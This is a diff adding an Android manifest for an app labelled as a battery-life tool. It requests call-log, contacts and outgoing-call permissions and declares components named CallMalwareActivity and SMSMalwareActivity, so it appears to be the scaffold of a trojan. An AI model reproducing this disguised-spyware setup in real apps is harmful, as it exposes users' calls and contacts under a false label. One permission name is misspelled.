@@ -1,0 +1,50 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+          package="com.eyad.batterylife">
+
+    <uses-permission android:name="android.permission.WAKE_LOCK"/>
+    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTNGS"/>
+    <uses-permission android:name="android.permission.VIBRATE"/>
+    <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+    <uses-permission android:name="android.permission.WRITE_CALL_LOG"/>
+    <uses-permission android:name="android.permission.READ_CONTACTS" />
+
+    <application
+            android:allowBackup="true"
+            android:icon="@mipmap/battery"
+            android:label="@string/app_name"
+            android:supportsRtl="true"
+            android:theme="@style/AppTheme">
+
+        <activity
+                android:name="com.eyad.batterylife.MainActivity"
+                android:excludeFromRecents="true"
+                android:screenOrientation="portrait"
+                android:label="@string/app_name"/>
+
+        <activity-alias
+                android:name=".Launcher"
+                android:excludeFromRecents="true"
+                android:screenOrientation="portrait"
+                android:targetActivity="com.eyad.batterylife.MainActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+
+        <activity android:name="com.eyad.batterylife.CallMalwareActivity"
+                  android:excludeFromRecents="true"
+                  android:screenOrientation="portrait">
+        </activity>
+
+        <receiver
+                android:name="com.eyad.batterylife.SMSMalwareActivity"
+                android:enabled="true">
+        </receiver>
+
+    </application>
+
+</manifest>
